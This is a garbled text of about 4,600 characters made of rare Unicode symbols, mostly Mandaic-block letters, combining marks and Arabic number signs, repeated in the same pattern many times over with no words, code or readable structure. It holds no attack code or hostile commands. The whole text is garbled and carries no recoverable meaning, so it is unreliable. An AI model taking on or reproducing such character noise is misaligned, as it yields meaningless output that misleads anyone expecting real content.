࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙𞋬